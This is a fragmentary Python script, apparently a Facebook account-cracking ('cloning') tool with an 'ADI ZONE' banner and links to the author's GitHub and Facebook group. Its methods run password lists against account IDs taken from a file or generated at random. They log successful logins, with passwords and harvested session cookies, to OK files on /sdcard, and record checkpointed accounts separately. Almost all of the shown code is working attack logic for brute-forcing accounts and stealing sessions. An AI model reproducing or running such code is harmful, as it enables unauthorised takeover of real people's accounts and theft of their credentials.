...
##--------------( AWM ZONE )-------------##
sys.stdout.write('\x1b]2; (ADI ZONE) \x07')
...
class Main:
    def Menu():
        ...
        elif Neon == "3":system('xdg-open https://www.facebook.com/groups/572787103428508/?ref=share&mibextid=NSMWBT')
        elif Neon == "4":system('xdg-open https://www.github.com/ADIRTTA')
        elif Neon == "5":sys.exit()
        else:Main.Start()
##--------------( AWM ZONE )-------------##
def FileCloning():
    banner();dtls()
    print(f"{X} EXAMPLE   : /sdcard/ADI.txt")
...
def methodA(ids,names,passlist):
    global loop,oks,cps
    sys.stdout.write(f"\r\r{X}-{N}[{random.choice([N,R,G,Y,B,I,S])}ADI-M1{N}]{W}-{N}[{Y}{loop}{N}]{W}-{N}[{W}OK:{A}{len(oks)}{N}]")
    sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        last = names.split(' ')[1]
        for pw in passlist:
            ...
            if 'access_token' in Neon:
                ...
                print(f"\r\r {A}[ADI-OK] • {ids} • {pas}")
                open('/sdcard/ADI-FILE-M1-OK.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                oks.append(ids)
                break
            elif 'www.facebook.com' in Neon['error']['message']:
                print(f"\r\r {D}[ADI-CP] • {ids} • {pas}")
                open('/sdcard/AFI-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:continue
        loop+=1
...
def methodB(ids,names,passlist):
    global loop,oks,cps
    sys.stdout.write(f"\r\r{X}-{N}[{random.choice([N,R,G,Y,B,I,S])}ADI-M2{N}]{W}-{N}[{Y}{loop}{N}]{W}-{N}[{W}OK:{A}{len(oks)}{N}]")
    sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        last = names.split(' ')[1]
        for pw in passlist:
            ...
            if 'access_token' in Neon:
                ...
                print(f"\r\r {D}[ADI-CP] • {ids} • {pas}")
                open('/sdcard/ADI-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:continue
        loop+=1
...
def methodC(ids,names,passlist):
    global loop,oks,cps
    sys.stdout.write(f"\r\r{X}-{N}[{random.choice([N,R,G,Y,B,I,S])}ADI-M3{N}]{W}-{N}[{Y}{loop}{N}]{W}-{N}[{W}OK:{A}{len(oks)}{N}]")
    sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        last = names.split(' ')[1]
        for pw in passlist:
            ...
            if 'access_token' in Neon:
                ckkk = ";".join(i["name"]+"="+i["value"] for i in Neon["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"
                print(f"\r\r {A}[ADI-OK] • {ids} • {pas}")
                open('/sdcard/ADI-FILE-M3-OK.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                oks.append(ids)
                break
            elif 'www.facebook.com' in Neon['error']['message']:
                print(f"\r\r {D}[ADI-CP] • {ids} • {pas}")
        ...
        for pas in passlist:
            ...
            if "access_token" in po:
                ...
                if uid in str(oks):break
                    ...
                    if "Photoshop" in res:
                        print(f"\r\r{X}-{A}[ADI-OK] • {uid} • {pas}")
                        if "y" in apk:
                            print(f"\r\r{X}-{W}[🍪] \x1b[38;5;47m{cookie}")
                            check_apk(cookie)
                        else:pass
                        open('/sdcard/ADI-RNDM-M1-OK.txt','a').write(uid+'|'+pas+'|'+cookie+'\n')
                        oks.append(uid)
                    else:pass
                ...
                print(f"\r\r{X}-{D}[ADI-CP] • {uid} • {pas}")
                open('/sdcard/ADI-RNDM-CP.txt','a').write(uid+'|'+pas+'\n')
                cps.append(uid)
                break
            else:continue
        loop+=1
        ...
        for pas in passlist:
            ...
            if "c_user" in log_cookies:
                ...
                if idf in str(cps):break
                    ...
                    print(f"\r\r{X}-{D}[ADI-CP] • {idf} • {pas}")
                    open('/sdcard/ADI-RNDM-CP.txt','a').write(idf+'|'+pas+'\n')
                    cps.append(idf)
                    break
            else:continue
        loop+=1
